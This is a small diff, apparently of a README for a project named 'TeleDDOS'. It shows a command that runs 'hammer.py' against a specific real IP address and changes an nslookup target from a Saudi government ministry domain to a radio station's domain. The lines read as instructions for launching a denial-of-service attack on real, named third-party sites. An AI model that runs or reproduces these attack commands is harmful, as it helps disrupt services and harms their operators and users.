@@ -8,6 +8,6 @@ cd TeleDDOS
 
 python3 hammer.py -s 136.243.145.232 
 
-nslookup www.moe.gov.sa
+nslookup www.radioalghad.com
 
 ```
